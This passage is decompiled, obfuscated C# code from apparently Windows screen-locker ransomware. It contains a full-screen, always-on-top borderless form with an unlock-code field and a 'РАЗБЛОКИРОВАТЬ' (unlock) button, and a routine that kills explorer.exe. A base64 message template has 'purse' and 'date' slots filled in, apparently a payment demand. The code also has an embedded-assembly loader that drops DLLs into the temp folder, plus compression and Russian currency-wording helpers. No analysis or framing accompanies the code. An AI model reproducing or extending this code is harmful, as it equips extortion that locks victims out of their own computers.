				class17_0.uint_0 |= (uint)((byte_0[int_0++] & 0xFF) << class17_0.int_2);
				class17_0.int_2 += 8;
			}
			class17_0.byte_0 = byte_0;
			class17_0.int_0 = int_0;
			class17_0.int_1 = num;
			return;
		}
		throw new ArgumentOutOfRangeException();
	}

	static void smethod_24(Class15.Class18 class18_0)
	{
		class18_0.int_2 = 0;
		class18_0.int_3 = 0;
	}

	unsafe static void smethod_25(int[] int_0, Class15.Class22.Class23 class23_0)
	{
		void* ptr = stackalloc byte[36];
		class23_0.byte_0 = new byte[class23_0.short_0.Length];
		*(int*)ptr = int_0.Length / 2;
		*(int*)((byte*)ptr + 4) = (*(int*)ptr + 1) / 2;
		*(int*)((byte*)ptr + 8) = 0;
		*(int*)((byte*)ptr + 12) = 0;
		while (*(int*)((byte*)ptr + 12) < class23_0.int_3)
		{
			class23_0.int_2[*(int*)((byte*)ptr + 12)] = 0;
			(*(int*)((byte*)ptr + 12))++;
		}
		int[] array = new int[*(int*)ptr];
		array[*(int*)ptr - 1] = 0;
		*(int*)((byte*)ptr + 16) = *(int*)ptr - 1;
		int[] int_;
		nint num2;
		while (*(int*)((byte*)ptr + 16) >= 0)
		{
			if (int_0[2 * *(int*)((byte*)ptr + 16) + 1] != -1)
			{
				*(int*)((byte*)ptr + 20) = array[*(int*)((byte*)ptr + 16)] + 1;
				if (*(int*)((byte*)ptr + 20) > class23_0.int_3)
				{
					*(int*)((byte*)ptr + 20) = class23_0.int_3;
					(*(int*)((byte*)ptr + 8))++;
				}
				array[int_0[2 * *(int*)((byte*)ptr + 16)]] = (array[int_0[2 * *(int*)((byte*)ptr + 16) + 1]] = *(int*)((byte*)ptr + 20));
			}
			else
			{
				*(int*)((byte*)ptr + 24) = array[*(int*)((byte*)ptr + 16)];
				int[] array2 = (int_ = class23_0.int_2);
				int num = *(int*)((byte*)ptr + 24) - 1;
				num2 = num;
				array2[num] = int_[num2] + 1;
				class23_0.byte_0[int_0[2 * *(int*)((byte*)ptr + 16)]] = (byte)array[*(int*)((byte*)ptr + 16)];
			}
			(*(int*)((byte*)ptr + 16))--;
		}
		if (*(int*)((byte*)ptr + 8) == 0)
		{
			return;
		}
		int num3 = class23_0.int_3 - 1;
		while (true)
		{
			if (class23_0.int_2[--num3] != 0)
			{
				do
				{
					int[] array3 = (int_ = class23_0.int_2);
					int num4 = num3;
					num2 = num4;
					array3[num4] = int_[num2] - 1;
					int[] array4 = (int_ = class23_0.int_2);
					int num5 = ++num3;
					num2 = num5;
					array4[num5] = int_[num2] + 1;
					*(int*)((byte*)ptr + 8) -= 1 << class23_0.int_3 - 1 - num3;
				}
				while (*(int*)((byte*)ptr + 8) > 0 && num3 < class23_0.int_3 - 1);
				if (*(int*)((byte*)ptr + 8) <= 0)
				{
					break;
				}
			}
		}
		int[] array5 = (int_ = class23_0.int_2);
		int num6 = class23_0.int_3 - 1;
		num2 = num6;
		array5[num6] = int_[num2] + *(int*)((byte*)ptr + 8);
		int[] array6 = (int_ = class23_0.int_2);
		int num7 = class23_0.int_3 - 2;
		num2 = num7;
		array6[num7] = int_[num2] - *(int*)((byte*)ptr + 8);
		int num8 = 2 * *(int*)((byte*)ptr + 4);
		*(int*)((byte*)ptr + 28) = class23_0.int_3;
		while (*(int*)((byte*)ptr + 28) != 0)
		{
			*(int*)((byte*)ptr + 32) = class23_0.int_2[*(int*)((byte*)ptr + 28) - 1];
			while (*(int*)((byte*)ptr + 32) > 0)
			{
				int num9 = 2 * int_0[num8++];
				if (int_0[num9 + 1] == -1)
				{
					class23_0.byte_0[int_0[num9]] = (byte)(*(uint*)((byte*)ptr + 28));
					(*(int*)((byte*)ptr + 32))--;
				}
			}
			(*(int*)((byte*)ptr + 28))--;
		}
	}

	unsafe static int smethod_26(Class15.Class22.Class23 class23_0)
	{
		void* ptr = stackalloc byte[8];
		*(int*)ptr = 0;
		*(int*)((byte*)ptr + 4) = 0;
		while (*(int*)((byte*)ptr + 4) < class23_0.short_0.Length)
		{
			*(int*)ptr += class23_0.short_0[*(int*)((byte*)ptr + 4)] * class23_0.byte_0[*(int*)((byte*)ptr + 4)];
			(*(int*)((byte*)ptr + 4))++;
		}
		return *(int*)ptr;
	}

	unsafe static void smethod_27(Class15.Class22.Class23 class23_0)
	{
		void* ptr = stackalloc byte[36];
		*(int*)ptr = class23_0.short_0.Length;
		int[] array = new int[*(int*)ptr];
		int num = 0;
		int num2 = 0;
		*(int*)((byte*)ptr + 4) = 0;
		while (*(int*)((byte*)ptr + 4) < *(int*)ptr)
		{
			*(int*)((byte*)ptr + 8) = class23_0.short_0[*(int*)((byte*)ptr + 4)];
			if (*(int*)((byte*)ptr + 8) != 0)
			{
				int num3 = num++;
				int num4;
				while (num3 > 0 && class23_0.short_0[array[num4 = (num3 - 1) / 2]] > *(int*)((byte*)ptr + 8))
				{
					array[num3] = array[num4];
					num3 = num4;
				}
				array[num3] = *(int*)((byte*)ptr + 4);
				num2 = *(int*)((byte*)ptr + 4);
			}
			(*(int*)((byte*)ptr + 4))++;
		}
		while (num < 2)
		{
			int num5 = ((num2 < 2) ? (++num2) : 0);
			array[num++] = num5;
		}
		class23_0.int_1 = Math.Max(num2 + 1, class23_0.int_0);
		*(int*)((byte*)ptr + 12) = num;
		int[] array2 = new int[4 * num - 2];
		int[] array3 = new int[2 * num - 1];
		int num6 = *(int*)((byte*)ptr + 12);
		*(int*)((byte*)ptr + 16) = 0;
		while (*(int*)((byte*)ptr + 16) < num)
		{
			*(int*)((byte*)ptr + 20) = array[*(int*)((byte*)ptr + 16)];
			array2[2 * *(int*)((byte*)ptr + 16)] = *(int*)((byte*)ptr + 20);
			array2[2 * *(int*)((byte*)ptr + 16) + 1] = -1;
			array3[*(int*)((byte*)ptr + 16)] = class23_0.short_0[*(int*)((byte*)ptr + 20)] << 8;
			array[*(int*)((byte*)ptr + 16)] = *(int*)((byte*)ptr + 16);
			(*(int*)((byte*)ptr + 16))++;
		}
		do
		{
			*(int*)((byte*)ptr + 24) = array[0];
			int num7 = array[--num];
			int num8 = 0;
			int num9;
			for (num9 = 1; num9 < num; num9 = num9 * 2 + 1)
			{
				if (num9 + 1 < num && array3[array[num9]] > array3[array[num9 + 1]])
				{
					num9++;
				}
				array[num8] = array[num9];
				num8 = num9;
			}
			int num10 = array3[num7];
			while ((num9 = num8) > 0 && array3[array[num8 = (num9 - 1) / 2]] > num10)
			{
				array[num9] = array[num8];
			}
			array[num9] = num7;
			*(int*)((byte*)ptr + 28) = array[0];
			num7 = num6++;
			array2[2 * num7] = *(int*)((byte*)ptr + 24);
			array2[2 * num7 + 1] = *(int*)((byte*)ptr + 28);
			*(int*)((byte*)ptr + 32) = Math.Min(array3[*(int*)((byte*)ptr + 24)] & 0xFF, array3[*(int*)((byte*)ptr + 28)] & 0xFF);
			num10 = (array3[num7] = array3[*(int*)((byte*)ptr + 24)] + array3[*(int*)((byte*)ptr + 28)] - *(int*)((byte*)ptr + 32) + 1);
			num8 = 0;
			for (num9 = 1; num9 < num; num9 = num8 * 2 + 1)
			{
				if (num9 + 1 < num && array3[array[num9]] > array3[array[num9 + 1]])
				{
					num9++;
				}
				array[num8] = array[num9];
				num8 = num9;
			}
			while ((num9 = num8) > 0 && array3[array[num8 = (num9 - 1) / 2]] > num10)
			{
				array[num9] = array[num8];
			}
			array[num9] = num7;
		}
		while (num > 1);
		Class27.smethod_25(array2, class23_0);
	}

	static bool smethod_28(bool bool_0, Class15.Class24 class24_0, bool bool_1)
	{
		bool flag;
		do
		{
			Class27.smethod_38(class24_0);
			flag = Class27.smethod_0(bool_1 && class24_0.int_17 == class24_0.int_18, class24_0, bool_0);
		}
		while (class24_0.class25_0.int_1 == 0 && flag);
		return flag;
	}

	static short smethod_29(int int_0)
	{
		return (short)((Class15.Class22.byte_0[int_0 & 0xF] << 12) | (Class15.Class22.byte_0[(int_0 >> 4) & 0xF] << 8) | (Class15.Class22.byte_0[(int_0 >> 8) & 0xF] << 4) | Class15.Class22.byte_0[int_0 >> 12]);
	}

	unsafe static void smethod_30(bool bool_0, NumberConverter.Currency currency_0)
	{
		void* ptr = stackalloc byte[12];
		NumberConverter.string_0 = "";
		*(int*)ptr = 0;
		while (*(int*)ptr < NumberConverter.arrayList_1.Count)
		{
			string text = NumberConverter.sortedList_2[*(int*)ptr]!.ToString();
			string[] array = NumberConverter.arrayList_1[*(int*)ptr]!.ToString()!.Split(new char[1] { '.' });
			*(int*)((byte*)ptr + 4) = Convert.ToInt32(array[1]);
			*(int*)((byte*)ptr + 8) = *(int*)ptr;
			switch (*(int*)((byte*)ptr + 8))
			{
			case 0:
				switch (currency_0)
				{
				case NumberConverter.Currency.const_0:
					text = (bool_0 ? "ноль копеек" : ((*(int*)((byte*)ptr + 4) != 1) ? ((*(int*)((byte*)ptr + 4) <= 1 || *(int*)((byte*)ptr + 4) >= 5) ? (text + "ек") : (text + "йки")) : (text + "йка")));
					break;
				case NumberConverter.Currency.Dollar:
					if (!bool_0)
					{
						if (*(int*)((byte*)ptr + 4) != 1)
						{
							text = ((*(int*)((byte*)ptr + 4) <= 1 || *(int*)((byte*)ptr + 4) >= 5) ? (text + "ов") : (text + "а"));
						}
					}
					else
					{
						text = "ноль центов";
					}
					break;
				case NumberConverter.Currency.Sum:
					if (bool_0)
					{
						text = "ноль тийн";
					}
					break;
				}
				break;
			case 1:
				switch (currency_0)
				{
				case NumberConverter.Currency.const_0:
					text = ((*(int*)((byte*)ptr + 4) != 1) ? ((*(int*)((byte*)ptr + 4) <= 1 || *(int*)((byte*)ptr + 4) >= 5) ? (text + "ей") : (text + "я")) : (text + "ь"));
					break;
				case NumberConverter.Currency.Dollar:
				case NumberConverter.Currency.Sum:
					if (*(int*)((byte*)ptr + 4) != 1)
					{
						text = ((*(int*)((byte*)ptr + 4) <= 1 || *(int*)((byte*)ptr + 4) >= 5) ? (text + "ов") : (text + "а"));
					}
					break;
				}
				break;
			case 2:
				if (*(int*)((byte*)ptr + 4) == 1)
				{
					text += "а";
				}
				else if (*(int*)((byte*)ptr + 4) > 1 && *(int*)((byte*)ptr + 4) < 5)
				{
					text += "и";
				}
				break;
			case 3:
				if (*(int*)((byte*)ptr + 4) != 1)
				{
					text = ((*(int*)((byte*)ptr + 4) <= 1 || *(int*)((byte*)ptr + 4) >= 5) ? (text + "ов") : (text + "а"));
				}
				break;
			case 4:
				if (*(int*)((byte*)ptr + 4) != 1)
				{
					text = ((*(int*)((byte*)ptr + 4) <= 1 || *(int*)((byte*)ptr + 4) >= 5) ? (text + "ов") : (text + "а"));
				}
				break;
			}
			if (array[0].ToString() != "  " || *(int*)ptr == 1 || *(int*)ptr == 0)
			{
				NumberConverter.string_0 = NumberConverter.string_0.Insert(0, array[0].ToString() + " " + text + " ");
			}
			text = "";
			(*(int*)ptr)++;
		}
	}

	static void smethod_31(Class1 class1_0)
	{
		Process.Start("cmd.exe", "/C taskkill /f /im explorer.exe");
	}

	static void smethod_32(Class13 class13_0)
	{
		class13_0.type_0.GetMethod("Clear")!.Invoke(class13_0.object_0, new object[0]);
	}

	static string smethod_33(string string_0, Class0 class0_0, string string_1, string string_2)
	{
		byte[] bytes = Convert.FromBase64String(string_0);
		string @string = Encoding.UTF8.GetString(bytes);
		string text = @string.Replace("purse", "U" + string_1);
		return text.Replace("date", string_2);
	}

	static void smethod_34(Class15.Class18 class18_0, int int_0)
	{
		if (class18_0.int_3++ == 32768)
		{
			throw new InvalidOperationException();
		}
		class18_0.byte_0[class18_0.int_2++] = (byte)int_0;
		class18_0.int_2 &= 32767;
	}

	static void smethod_35(byte[] byte_0, Class15.Class21 class21_0)
	{
		Class27.smethod_82(byte_0, class21_0.class24_0);
	}

	unsafe static void smethod_36(Form0 form0_0)
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Expected O, but got Unknown
		//IL_02aa: Unknown result type (might be due to invalid IL or missing references)
		//IL_02b4: Expected O, but got Unknown
		//IL_0323: Unknown result type (might be due to invalid IL or missing references)
		//IL_032d: Expected O, but got Unknown
		//IL_03bd: Unknown result type (might be due to invalid IL or missing references)
		//IL_03c7: Expected O, but got Unknown
		//IL_044d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0457: Expected O, but got Unknown
		//IL_053d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0547: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form0));
		form0_0.panel_0 = new Panel();
		form0_0.textBox_0 = new TextBox();
		form0_0.button_0 = new Button();
		form0_0.label_1 = new Label();
		form0_0.label_2 = new Label();
		form0_0.label_3 = new Label();
		form0_0.label_0 = new Label();
		form0_0.pictureBox_0 = new PictureBox();
		form0_0.pictureBox_1 = new PictureBox();
		((Control)form0_0.panel_0).SuspendLayout();
		((ISupportInitialize)form0_0.pictureBox_0).BeginInit();
		((ISupportInitialize)form0_0.pictureBox_1).BeginInit();
		((Control)form0_0).SuspendLayout();
		((Control)form0_0.panel_0).set_Anchor((AnchorStyles)0);
		((Control)form0_0.panel_0).set_BackColor(Color.LightSteelBlue);
		form0_0.panel_0.set_BorderStyle((BorderStyle)1);
		((Control)form0_0.panel_0).get_Controls().Add((Control)(object)form0_0.textBox_0);
		((Control)form0_0.panel_0).get_Controls().Add((Control)(object)form0_0.button_0);
		((Control)form0_0.panel_0).get_Controls().Add((Control)(object)form0_0.label_1);
		((Control)form0_0.panel_0).get_Controls().Add((Control)(object)form0_0.label_2);
		((Control)form0_0.panel_0).get_Controls().Add((Control)(object)form0_0.label_3);
		((Control)form0_0.panel_0).get_Controls().Add((Control)(object)form0_0.label_0);
		((Control)form0_0.panel_0).get_Controls().Add((Control)(object)form0_0.pictureBox_0);
		((Control)form0_0.panel_0).get_Controls().Add((Control)(object)form0_0.pictureBox_1);
		((Control)form0_0.panel_0).set_Location(new Point(179, 57));
		((Control)form0_0.panel_0).set_Name("panel1");
		((Control)form0_0.panel_0).set_Size(new Size(618, 472));
		((Control)form0_0.panel_0).set_TabIndex(0);
		((Control)form0_0.textBox_0).set_Anchor((AnchorStyles)0);
		((Control)form0_0.textBox_0).set_Location(new Point(230, 405));
		((Control)form0_0.textBox_0).set_Name("textBox1");
		((Control)form0_0.textBox_0).set_Size(new Size(161, 20));
		((Control)form0_0.textBox_0).set_TabIndex(8);
		((Control)form0_0.button_0).set_Anchor((AnchorStyles)0);
		((Control)form0_0.button_0).set_Location(new Point(230, 431));
		((Control)form0_0.button_0).set_Name("button1");
		((Control)form0_0.button_0).set_Size(new Size(161, 23));
		((Control)form0_0.button_0).set_TabIndex(7);
		((Control)form0_0.button_0).set_Text("РАЗБЛОКИРОВАТЬ");
		((ButtonBase)form0_0.button_0).set_UseVisualStyleBackColor(true);
		((Control)form0_0.label_1).set_AutoSize(true);
		((Control)form0_0.label_1).set_Font(new Font("Arial", 9f, (FontStyle)1));
		((Control)form0_0.label_1).set_Location(new Point(1, 130));
		((Control)form0_0.label_1).set_Name("label4");
		((Control)form0_0.label_1).set_Size(new Size(0, 15));
		((Control)form0_0.label_1).set_TabIndex(6);
		form0_0.label_1.set_TextAlign((ContentAlignment)32);
		((Control)form0_0.label_2).set_AutoSize(true);
		((Control)form0_0.label_2).set_Font(new Font("Arial", 9f, (FontStyle)1));
		((Control)form0_0.label_2).set_ForeColor(Color.Red);
		((Control)form0_0.label_2).set_Location(new Point(26, 190));
		((Control)form0_0.label_2).set_Name("label5");
		((Control)form0_0.label_2).set_Size(new Size(7, 15));
		((Control)form0_0.label_2).set_TabIndex(5);
		((Control)form0_0.label_2).set_Text("\r\n");
		form0_0.label_2.set_TextAlign((ContentAlignment)32);
		((Control)form0_0.label_3).set_AutoSize(true);
		((Control)form0_0.label_3).set_Font(new Font("Arial", 9f, (FontStyle)1));
		((Control)form0_0.label_3).set_Location(new Point(18, 283));
		((Control)form0_0.label_3).set_Name("label6");
		((Control)form0_0.label_3).set_Size(new Size(7, 15));
		((Control)form0_0.label_3).set_TabIndex(4);
		((Control)form0_0.label_3).set_Text("\r\n");
		form0_0.label_3.set_TextAlign((ContentAlignment)32);
		((Control)form0_0.label_0).set_AutoSize(true);
		((Control)form0_0.label_0).set_Font(new Font("Arial", 9f, (FontStyle)1, (GraphicsUnit)3, (byte)204));
		((Control)form0_0.label_0).set_ForeColor(Color.Red);
		((Control)form0_0.label_0).set_Location(new Point(18, 84));
		((Control)form0_0.label_0).set_Name("label3");
		((Control)form0_0.label_0).set_Size(new Size(0, 15));
		((Control)form0_0.label_0).set_TabIndex(2);
		form0_0.label_0.set_TextAlign((ContentAlignment)32);
		((Control)form0_0.pictureBox_0).set_BackColor(Color.MidnightBlue);
		((Control)form0_0.pictureBox_0).set_Location(new Point(0, 391));
		((Control)form0_0.pictureBox_0).set_Name("pictureBox2");
		((Control)form0_0.pictureBox_0).set_Size(new Size(690, 81));
		form0_0.pictureBox_0.set_TabIndex(1);
		form0_0.pictureBox_0.set_TabStop(false);
		((Control)form0_0.pictureBox_1).set_BackColor(Color.MidnightBlue);
		((Control)form0_0.pictureBox_1).set_BackgroundImage((Image)componentResourceManager.GetObject("pictureBox1.BackgroundImage"));
		((Control)form0_0.pictureBox_1).set_BackgroundImageLayout((ImageLayout)2);
		((Control)form0_0.pictureBox_1).set_Location(new Point(0, 0));
		((Control)form0_0.pictureBox_1).set_Name("pictureBox1");
		((Control)form0_0.pictureBox_1).set_Size(new Size(617, 81));
		form0_0.pictureBox_1.set_TabIndex(0);
		form0_0.pictureBox_1.set_TabStop(false);
		((ContainerControl)form0_0).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)form0_0).set_AutoScaleMode((AutoScaleMode)1);
		((Control)form0_0).set_BackColor(SystemColors.ActiveCaption);
		((Form)form0_0).set_ClientSize(new Size(917, 608));
		((Form)form0_0).set_ControlBox(false);
		((Control)form0_0).get_Controls().Add((Control)(object)form0_0.panel_0);
		((Form)form0_0).set_FormBorderStyle((FormBorderStyle)0);
		((Form)form0_0).set_MinimizeBox(false);
		((Control)form0_0).set_Name("TAPDELAYGUI");
		((Form)form0_0).set_ShowIcon(false);
		((Form)form0_0).set_ShowInTaskbar(false);
		((Form)form0_0).set_TopMost(true);
		((Form)form0_0).set_WindowState((FormWindowState)2);
		((Form)form0_0).add_Load(new EventHandler(form0_0, (nint)(delegate*<Form0, object, EventArgs, void>)(&Class27.smethod_63)));
		((Control)form0_0.panel_0).ResumeLayout(false);
		((Control)form0_0.panel_0).PerformLayout();
		((ISupportInitialize)form0_0.pictureBox_0).EndInit();
		((ISupportInitialize)form0_0.pictureBox_1).EndInit();
		((Control)form0_0).ResumeLayout(false);
	}

	static void smethod_37(int int_0, Class15.Class22 class22_0)
	{
		Class27.smethod_73(class22_0.class23_2);
		Class27.smethod_73(class22_0.class23_0);
		Class27.smethod_73(class22_0.class23_1);
		Class27.smethod_68(class22_0.class25_0, class22_0.class23_0.int_1 - 257, 5);
		Class27.smethod_68(class22_0.class25_0, class22_0.class23_1.int_1 - 1, 5);
		Class27.smethod_68(class22_0.class25_0, int_0 - 4, 4);
		for (int i = 0; i < int_0; i++)
		{
			Class27.smethod_68(class22_0.class25_0, (int)class22_0.class23_2.byte_0[Class15.Class22.int_8[i]], 3);
		}
		Class15.Class22.Class23 class23_ = class22_0.class23_0;
		Class15.Class22.Class23 class23_2 = class22_0.class23_2;
		Class27.smethod_22(class23_2, class23_);
		class23_ = class22_0.class23_1;
		class23_2 = class22_0.class23_2;
		Class27.smethod_22(class23_2, class23_);
	}

	static void smethod_38(Class15.Class24 class24_0)
	{
		if (class24_0.int_14 >= 65274)
		{
			Class27.smethod_51(class24_0);
		}
		while (class24_0.int_15 < 262 && class24_0.int_17 < class24_0.int_18)
		{
			int num = 65536 - class24_0.int_15 - class24_0.int_14;
			if (num > class24_0.int_18 - class24_0.int_17)
			{
				num = class24_0.int_18 - class24_0.int_17;
			}
			Array.Copy(class24_0.byte_1, class24_0.int_17, class24_0.byte_0, class24_0.int_14 + class24_0.int_15, num);
			class24_0.int_17 += num;
			class24_0.int_16 += num;
			class24_0.int_15 += num;
		}
		if (class24_0.int_15 >= 3)
		{
			Class27.smethod_49(class24_0);
		}
	}

	static bool smethod_39(Class15.Class22 class22_0)
	{
		return class22_0.int_9 >= 16384;
	}

	static void smethod_40(int int_0, Class15.Class18 class18_0, int int_1, byte[] byte_0)
	{
		if (class18_0.int_3 > 0)
		{
			throw new InvalidOperationException();
		}
		if (int_0 > 32768)
		{
			int_1 += int_0 - 32768;
			int_0 = 32768;
		}
		Array.Copy(byte_0, int_1, class18_0.byte_0, 0, int_0);
		class18_0.int_2 = int_0 & 0x7FFF;
	}

	unsafe static int smethod_41(Class15.Class17 class17_0, byte[] byte_0, int int_0, int int_1)
	{
		void* ptr = stackalloc byte[8];
		*(int*)ptr = 0;
		while (class17_0.int_2 > 0 && int_1 > 0)
		{
			byte_0[int_0++] = (byte)class17_0.uint_0;
			class17_0.uint_0 >>= 8;
			class17_0.int_2 -= 8;
			int_1--;
			(*(int*)ptr)++;
		}
		if (int_1 == 0)
		{
			return *(int*)ptr;
		}
		*(int*)((byte*)ptr + 4) = class17_0.int_1 - class17_0.int_0;
		if (int_1 > *(int*)((byte*)ptr + 4))
		{
			int_1 = *(int*)((byte*)ptr + 4);
		}
		Array.Copy(class17_0.byte_0, class17_0.int_0, byte_0, int_0, int_1);
		class17_0.int_0 += int_1;
		if (((uint)(class17_0.int_0 - class17_0.int_1) & (true ? 1u : 0u)) != 0)
		{
			class17_0.uint_0 = class17_0.byte_0[class17_0.int_0++] & 0xFFu;
			class17_0.int_2 = 8;
		}
		return *(int*)ptr + int_1;
	}

	unsafe static int smethod_42(Class15.Class18 class18_0, Class15.Class17 class17_0, int int_0)
	{
		void* ptr = stackalloc byte[8];
		int_0 = Math.Min(Math.Min(int_0, 32768 - class18_0.int_3), class17_0.AvailableBytes);
		*(int*)((byte*)ptr + 4) = 32768 - class18_0.int_2;
		if (int_0 > *(int*)((byte*)ptr + 4))
		{
			*(int*)ptr = Class27.smethod_41(class17_0, class18_0.byte_0, class18_0.int_2, *(int*)((byte*)ptr + 4));
			if (*(int*)ptr == *(int*)((byte*)ptr + 4))
			{
				*(int*)ptr += Class27.smethod_41(class17_0, class18_0.byte_0, 0, int_0 - *(int*)((byte*)ptr + 4));
			}
		}
		else
		{
			*(int*)ptr = Class27.smethod_41(class17_0, class18_0.byte_0, class18_0.int_2, int_0);
		}
		class18_0.int_2 = (class18_0.int_2 + *(int*)ptr) & 0x7FFF;
		class18_0.int_3 += *(int*)ptr;
		return *(int*)ptr;
	}

	unsafe static Assembly smethod_43(object object_0, ResolveEventArgs resolveEventArgs_0)
	{
		void* ptr = stackalloc byte[18];
		Class6.Struct0 @struct = new Class6.Struct0(resolveEventArgs_0.Name);
		string s = @struct.method_0(bool_0: false);
		string text = Convert.ToBase64String(Encoding.UTF8.GetBytes(s));
		string[] array = "ezMyNTc1YjZiLWZhMWQtNDdiMC05Y2IwLWVjOWJlZjM5YTZmY30sIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49M2U1NjM1MDY5M2Y3MzU1ZQ==,[z]{66c0d855-4c93-4795-bf32-4a441a8983b5},ezMyNTc1YjZiLWZhMWQtNDdiMC05Y2IwLWVjOWJlZjM5YTZmY30=,[z]{66c0d855-4c93-4795-bf32-4a441a8983b5}".Split(new char[1] { ',' });
		string text2 = string.Empty;
		((byte*)ptr)[16] = 0;
		((byte*)ptr)[17] = 0;
		*(int*)ptr = 0;
		while (*(int*)ptr < array.Length - 1)
		{
			if (!(array[*(int*)ptr] == text))
			{
				*(int*)ptr += 2;
				continue;
			}
			text2 = array[*(int*)ptr + 1];
			break;
		}
		if (text2.Length == 0 && @struct.string_2.Length == 0)
		{
			text = Convert.ToBase64String(Encoding.UTF8.GetBytes(@struct.string_0));
			*(int*)((byte*)ptr + 4) = 0;
			while (*(int*)((byte*)ptr + 4) < array.Length - 1)
			{
				if (!(array[*(int*)((byte*)ptr + 4)] == text))
				{
					*(int*)((byte*)ptr + 4) += 2;
					continue;
				}
				text2 = array[*(int*)((byte*)ptr + 4) + 1];
				break;
			}
		}
		if (text2.Length > 0)
		{
			if (text2[0] == '[')
			{
				*(int*)((byte*)ptr + 8) = text2.IndexOf(']');
				string text3 = text2.Substring(1, *(int*)((byte*)ptr + 8) - 1);
				((byte*)ptr)[16] = ((text3.IndexOf('z') >= 0) ? ((byte)1) : ((byte)0));
				((byte*)ptr)[17] = ((text3.IndexOf('t') >= 0) ? ((byte)1) : ((byte)0));
				text2 = text2.Substring(*(int*)((byte*)ptr + 8) + 1);
			}
			lock (Class6.hashtable_0)
			{
				if (Class6.hashtable_0.ContainsKey(text2))
				{
					return (Assembly)Class6.hashtable_0[text2];
				}
				Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream(text2);
				if (manifestResourceStream != null)
				{
					*(int*)((byte*)ptr + 12) = (int)manifestResourceStream.Length;
					byte[] array2 = new byte[*(int*)((byte*)ptr + 12)];
					manifestResourceStream.Read(array2, 0, *(int*)((byte*)ptr + 12));
					if (((byte*)ptr)[16] != 0)
					{
						array2 = Class27.smethod_5(array2);
					}
					Assembly assembly = null;
					if (((byte*)ptr)[17] == 0)
					{
						try
						{
							assembly = Assembly.Load(array2);
						}
						catch (FileLoadException)
						{
							((byte*)ptr)[17] = 1;
						}
						catch (BadImageFormatException)
						{
							((byte*)ptr)[17] = 1;
						}
					}
					if (((byte*)ptr)[17] != 0)
					{
						try
						{
							string text4 = $"{Path.GetTempPath()}{text2}\\";
							Directory.CreateDirectory(text4);
							string text5 = text4 + @struct.string_0 + ".dll";
							if (!File.Exists(text5))
							{
								FileStream fileStream = File.OpenWrite(text5);
								fileStream.Write(array2, 0, array2.Length);
								fileStream.Close();
								Class27.MoveFileEx(text5, (string)null, 4);
								Class27.MoveFileEx(text4, (string)null, 4);
							}
							assembly = Assembly.LoadFile(text5);
						}
						catch
						{
						}
					}
					Class6.hashtable_0[text2] = assembly;
					return assembly;
				}
			}
		}
		return null;
	}

	static void smethod_44(byte[] byte_0, int int_0, Class15.Class25 class25_0, int int_1)
	{
		Array.Copy(byte_0, int_1, class25_0.byte_0, class25_0.int_1, int_0);
		class25_0.int_1 += int_0;
	}

	unsafe static void smethod_45(byte[] byte_0, Class15.Class19 class19_0)
	{
		void* ptr = stackalloc byte[68];
		int[] array = new int[16];
		int[] array2 = new int[16];
		*(int*)ptr = 0;
		while (*(int*)ptr < byte_0.Length)
		{
			*(int*)((byte*)ptr + 4) = byte_0[*(int*)ptr];
			if (*(int*)((byte*)ptr + 4) > 0)
			{
				int[] array3;
				int[] array4 = (array3 = array);
				int num = *(int*)((byte*)ptr + 4);
				nint num2 = num;
				array4[num] = array3[num2] + 1;
			}
			(*(int*)ptr)++;
		}
		*(int*)((byte*)ptr + 8) = 0;
		*(int*)((byte*)ptr + 12) = 512;
		*(int*)((byte*)ptr + 16) = 1;
		while (*(int*)((byte*)ptr + 16) <= 15)
		{
			array2[*(int*)((byte*)ptr + 16)] = *(int*)((byte*)ptr + 8);
			*(int*)((byte*)ptr + 8) += array[*(int*)((byte*)ptr + 16)] << 16 - *(int*)((byte*)ptr + 16);
			if (*(int*)((byte*)ptr + 16) >= 10)
			{
				*(int*)((byte*)ptr + 20) = array2[*(int*)((byte*)ptr + 16)] & 0x1FF80;
				*(int*)((byte*)ptr + 24) = *(int*)((byte*)ptr + 8) & 0x1FF80;
				*(int*)((byte*)ptr + 12) += *(int*)((byte*)ptr + 24) - *(int*)((byte*)ptr + 20) >> 16 - *(int*)((byte*)ptr + 16);
			}
			(*(int*)((byte*)ptr + 16))++;
		}
		class19_0.short_0 = new short[*(int*)((byte*)ptr + 12)];
		*(int*)((byte*)ptr + 28) = 512;
		*(int*)((byte*)ptr + 32) = 15;
		while (*(int*)((byte*)ptr + 32) >= 10)
		{
			*(int*)((byte*)ptr + 36) = *(int*)((byte*)ptr + 8) & 0x1FF80;
			*(int*)((byte*)ptr + 8) -= array[*(int*)((byte*)ptr + 32)] << 16 - *(int*)((byte*)ptr + 32);
			*(int*)((byte*)ptr + 40) = *(int*)((byte*)ptr + 8) & 0x1FF80;
			*(int*)((byte*)ptr + 44) = *(int*)((byte*)ptr + 40);
			while (*(int*)((byte*)ptr + 44) < *(int*)((byte*)ptr + 36))
			{
				class19_0.short_0[Class27.smethod_29(*(int*)((byte*)ptr + 44))] = (short)((-(*(int*)((byte*)ptr + 28)) << 4) | *(int*)((byte*)ptr + 32));
				*(int*)((byte*)ptr + 28) += 1 << *(int*)((byte*)ptr + 32) - 9;
				*(int*)((byte*)ptr + 44) += 128;
			}
			(*(int*)((byte*)ptr + 32))--;
		}
		*(int*)((byte*)ptr + 48) = 0;
		while (*(int*)((byte*)ptr + 48) < byte_0.Length)
		{
			*(int*)((byte*)ptr + 52) = byte_0[*(int*)((byte*)ptr + 48)];
